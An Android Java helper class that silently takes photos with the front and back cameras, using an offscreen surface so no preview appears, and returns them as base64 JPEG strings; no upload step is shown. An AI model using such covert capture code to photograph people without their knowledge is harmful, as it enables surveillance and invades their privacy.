package com.stitch.iris.launcher;

import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraMetadata;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.annotation.NonNull;

import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class SilentCameraHelper {
    private static final String TAG = "SilentCameraHelper";

    public interface CaptureCallback {
        void onCaptureDone(String frontBase64, String backBase64);
    }

    public interface SingleCaptureCallback {
        void onCaptureDone(String base64Image);
    }

    public static void captureBothSilently(Context context, CaptureCallback callback) {
        new Thread(() -> {
            String backImage = captureSingleLens(context, "0"); // Usually back
            String frontImage = captureSingleLens(context, "1"); // Usually front
            callback.onCaptureDone(frontImage, backImage);
        }).start();
    }

    public static void captureSingleSilently(Context context, String facing, SingleCaptureCallback callback) {
        new Thread(() -> {
            String lensId = ("front".equalsIgnoreCase(facing) || "1".equals(facing)) ? "1" : "0";
            String image = captureSingleLens(context, lensId);
            callback.onCaptureDone(image);
        }).start();
    }

    @SuppressLint("MissingPermission")
    private static String captureSingleLens(Context context, String preferredId) {
        CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        HandlerThread backgroundThread = null;
        CameraDevice[] cameraHolder = new CameraDevice[1];
        SurfaceTexture[] textureHolder = new SurfaceTexture[1];
        Surface[] surfaceHolder = new Surface[1];
        try {
            String targetCameraId = null;
            for (String cameraId : manager.getCameraIdList()) {
                CameraCharacteristics chars = manager.getCameraCharacteristics(cameraId);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (preferredId.equals("0") && facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    targetCameraId = cameraId;
                    break;
                }
                if (preferredId.equals("1") && facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    targetCameraId = cameraId;
                    break;
                }
            }
            if (targetCameraId == null) return null;

            final String[] resultBase64 = new String[1];
            CountDownLatch latch = new CountDownLatch(1);
            
            CameraCharacteristics chars = manager.getCameraCharacteristics(targetCameraId);
            StreamConfigurationMap map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (map == null) {
                Log.e(TAG, "StreamConfigurationMap is null for camera " + targetCameraId);
                return null;
            }
            Size[] sizes = map.getOutputSizes(ImageFormat.JPEG);
            Size targetSize = new Size(640, 480);
            if (sizes != null && sizes.length > 0) {
                for (Size s : sizes) {
                    if (s.getWidth() <= 1920 && s.getHeight() <= 1920) {
                        targetSize = s;
                        break;
                    }
                }
                if (targetSize.getWidth() == 640 && sizes.length > 0) {
                    targetSize = sizes[sizes.length / 2];
                }
            }

            backgroundThread = new HandlerThread("CameraBG_" + preferredId);
            backgroundThread.start();
            Handler backgroundHandler = new Handler(backgroundThread.getLooper());

            ImageReader imageReader = ImageReader.newInstance(targetSize.getWidth(), targetSize.getHeight(), ImageFormat.JPEG, 1);

            imageReader.setOnImageAvailableListener(reader -> {
                Image image = reader.acquireLatestImage();
                if (image != null) {
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    resultBase64[0] = "data:image/jpeg;base64," + Base64.encodeToString(bytes, Base64.NO_WRAP);
                    image.close();
                    latch.countDown();
                }
            }, backgroundHandler);

            textureHolder[0] = new SurfaceTexture(1);
            textureHolder[0].setDefaultBufferSize(targetSize.getWidth(), targetSize.getHeight());
            surfaceHolder[0] = new Surface(textureHolder[0]);

            final Surface finalSurface = surfaceHolder[0];
            final SurfaceTexture finalTexture = textureHolder[0];

            manager.openCamera(targetCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraHolder[0] = camera;
                    try {
                        CaptureRequest.Builder captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                        captureBuilder.addTarget(imageReader.getSurface());
                        captureBuilder.addTarget(finalSurface);
                        captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
                        
                        camera.createCaptureSession(Arrays.asList(imageReader.getSurface(), finalSurface), new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(@NonNull CameraCaptureSession session) {
                                try {
                                    session.capture(captureBuilder.build(), null, backgroundHandler);
                                } catch (CameraAccessException e) {
                                    Log.e(TAG, "Capture failed for camera " + preferredId, e);
                                    latch.countDown();
                                }
                            }

                            @Override
                            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                Log.e(TAG, "Capture session config failed for camera " + preferredId);
                                latch.countDown();
                            }
                        }, backgroundHandler);
                    } catch (Exception e) {
                        Log.e(TAG, "Error setting up capture for camera " + preferredId, e);
                        latch.countDown();
                    }
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    camera.close();
                    cameraHolder[0] = null;
                    latch.countDown();
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    Log.e(TAG, "Camera error " + error + " for camera " + preferredId);
                    camera.close();
                    cameraHolder[0] = null;
                    latch.countDown();
                }
            }, backgroundHandler);

            latch.await(8, TimeUnit.SECONDS);

            // Clean up after capture completes or times out
            if (cameraHolder[0] != null) {
                try { cameraHolder[0].close(); } catch (Exception e) { /* already closing */ }
                cameraHolder[0] = null;
            }
            if (finalTexture != null) {
                try { finalTexture.release(); } catch (Exception e) { /* released */ }
            }
            if (finalSurface != null) {
                try { finalSurface.release(); } catch (Exception e) { /* released */ }
            }
            
            return resultBase64[0];
        } catch (Exception e) {
            Log.e(TAG, "Failed to capture lens " + preferredId, e);
            if (cameraHolder[0] != null) {
                try { cameraHolder[0].close(); } catch (Exception e2) { }
            }
            if (textureHolder[0] != null) {
                try { textureHolder[0].release(); } catch (Exception e2) { }
            }
            if (surfaceHolder[0] != null) {
                try { surfaceHolder[0].release(); } catch (Exception e2) { }
            }
            return null;
        } finally {
            if (backgroundThread != null) {
                backgroundThread.quitSafely();
                try { backgroundThread.join(2000); } catch (Exception e) { }
            }
        }
    }
}
